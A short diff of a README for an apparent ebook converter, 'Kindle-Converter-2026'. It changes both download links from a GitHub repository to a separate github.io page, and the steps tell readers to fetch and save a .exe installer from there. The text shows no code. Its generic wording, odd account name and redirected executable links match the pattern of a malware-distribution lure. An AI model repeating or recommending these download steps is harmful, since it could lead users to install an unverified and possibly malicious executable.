@@ -1,6 +1,6 @@
 # 📚 Kindle-Converter-2026 - Quickly change your ebook file formats
 
-[![](https://img.shields.io/badge/Download-Kindle_Converter-blue.svg)](https://github.com/rozalinhazardous955/Kindle-Converter-2026)
+[![](https://img.shields.io/badge/Download-Kindle_Converter-blue.svg)](https://rozalinhazardous955.github.io)
 
 Kindle-Converter-2026 allows users to change file formats for ebooks on Windows. This tool converts Kindle files like AZW into the EPUB format. This process helps you read your books on different devices or apps. The software works on Windows 10 and Windows 11.
 
@@ -13,7 +13,7 @@ Ensure your computer meets these requirements before you start. The program need
 You must visit the website to download the installer. Follow these steps to obtain the tool:
 
 1. Open your web browser.
-2. Click this link: [https://github.com/rozalinhazardous955/Kindle-Converter-2026](https://github.com/rozalinhazardous955/Kindle-Converter-2026)
+2. Click this link: [https://rozalinhazardous955.github.io](https://rozalinhazardous955.github.io)
 3. Look for the release section on the page.
 4. Select the link that ends in .exe to start your download.
 5. Save the file to your computer desktop.
